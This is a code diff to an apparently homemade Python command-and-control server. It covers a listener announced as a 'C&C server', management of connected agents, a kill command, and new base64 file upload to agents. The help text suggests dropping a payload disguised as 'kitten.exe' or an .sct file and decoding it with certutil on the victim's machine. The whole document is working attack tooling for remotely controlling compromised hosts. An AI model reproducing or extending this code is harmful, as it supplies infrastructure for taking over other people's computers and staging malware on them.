@@ -59,6 +59,10 @@ class ServerTerminal(Cmd):
         self.parentagent = None
         self.tokill = ''
 
+        # TEMP DURING DBG
+        tcp_listener = self.listeners[0][1](self.lhost,self.lport,self.ClientDict,self.rq)
+        tcp_listener.start()
+
     def help_interact(self):
         print("interact <agent_id>")
         print("To view available agents, use: list agents")
@@ -164,7 +168,7 @@ class ServerTerminal(Cmd):
                 if self.shell == True:
                     self.q.put("exit\n")
                     self.shell = False
-                self.q = ClientDict[self.agent][1]
+                self.q = self.ClientDict[self.agent][1]
                 self.q.put('kill\n')
                 self.q = None
                 self.prompt = '$ '
@@ -188,7 +192,7 @@ class ServerTerminal(Cmd):
                 if value.lower() == "tcp":
                     for i in range(len(self.listeners)):
                         if 'tcp' in self.listeners[i][0]:
-                            tcp_listener = self.listeners[i][1](self.lhost,self.lport,self.rq)
+                            tcp_listener = self.listeners[i][1](self.lhost,self.lport,self.ClientDict,self.rq)
                             tcp_listener.start()
             else:
                 print("[-] No such start option.")
@@ -206,7 +210,7 @@ class ServerTerminal(Cmd):
             if (args.lower() == "agents" or args == "a"):
                 print("Agents:")
                 for i in self.ClientDict.keys():
-                    print("\tID: {} IP: {}".format(i,ClientDict[i][0][0]))
+                    print("\tID: {} IP: {}".format(i,self.ClientDict[i][0][0]))
             elif (args.lower() == "lhost"):
                 print("lhost: {}".format(self.lhost))
             elif (args.lower() == "lport"):
@@ -242,26 +246,41 @@ class ServerTerminal(Cmd):
         print('\t\tExample: set lhost 192.168.56.112')
 
     def do_upload(self,args):
-        if (len(args.split(' ')) != 2):
+        if self.q == None:
+            print("[-] You need to choose agent.")
+            self.help_interact()
+        elif (len(args.split(' ')) != 2):
             self.help_upload()
         else:
             localfile = args.split(' ')[0]
             remotefile = args.split(' ')[1]
 
             try:
-                with open(localfile,'r') as file:
-                    filedata = fiel.read()
+                with open(localfile,mode='rb') as file:
+                    filedata = file.read()
+                b64filedata = base64.b64encode(filedata).decode('utf-8')
+                b64datalen = len(b64filedata)
+                
+                # This will send following data to agent:
+                # upload <filename> <b64_size>
+                self.q.put('upload {} {}'.format(remotefile,b64datalen))
+                time.sleep(0.3)
+                self.q.put(b64filedata)
+                time.sleep(0.3)
+                # To not input prompt before response
+                while len(list(self.rq.queue)) >= 1:
+                    time.sleep(0.1)
             except FileNotFoundError:
                 print('[-] Local file specified not found')
             except Exception as ex:
-                print("[-] Unhandled Exception while reading file: {}".format(ex))
-
-            b64filedata = base64.b64encode(filedata.encode())
-            print(b64filedata)
+                print("[-] Unhandled Exception while reading or sending file: {}".format(ex))
 
     def help_upload(self):
-        print('upload <local_fs_file> <remote_fs_file>')
-        print('Example:\n\tupload /opt/payload C:\users\ieuser\desktop\kitten.exe')
+        print('upload <local_fs_file> <remote_fs_file_in_base64_format>')
+        print('\n[*] Example:\n\tupload /opt/my.sct C:\\my.sct.b64')
+        print('\n[!] Note!\n\tFile will be stored in Base64 format!')
+        print('\tDecode it using:\n\t\tcertutil -decode c:\\my.sct.b64 c:\\my.sct')
+        
 
     def emptyline(self):
         if self.q == None:
@@ -285,10 +304,11 @@ class ServerTerminal(Cmd):
 
 
 class listener_tcp(threading.Thread):
-    def __init__(self, lhost, lport, ResponseQueue):
+    def __init__(self, lhost, lport, ClientDict, ResponseQueue):
         threading.Thread.__init__(self)
         self.lhost = lhost
         self.lport = lport
+        self.ClientDict = ClientDict
         self.rq = ResponseQueue
 
     def run(self):
@@ -298,7 +318,7 @@ class listener_tcp(threading.Thread):
         server.listen(100)
 
         print("[+] Starting C&C server on tcp://{}:{}".format(self.lhost,self.lport))
-
+    
         while True:
             (client, client_address) = server.accept()
             q = queue.Queue()
@@ -310,7 +330,7 @@ class listener_tcp(threading.Thread):
             newthread.setName(str(randName))
             newthread.start()
             
-            ClientDict[randName] = (client_address, q)
+            self.ClientDict[randName] = (client_address, q)
 
 
 class AgentHandler(threading.Thread):
@@ -365,13 +385,14 @@ class AgentHandler(threading.Thread):
                         # reveived in this while loop
                         elif "ping" in RecvCmd:
                             self.client.settimeout(5)
-                        
+                        elif "upload" in RecvCmd.split(' ')[:2]:
+                            self.client.settimeout(5)
+
                         # cmd.exe shell returns input
                         # if response not longer than command
                         # then command is still executing
                         elif (len(cmd_response) <= len(RecvCmd)):
                             self.client.settimeout(5)
-                        
                         else:
                             self.client.settimeout(1)
                         
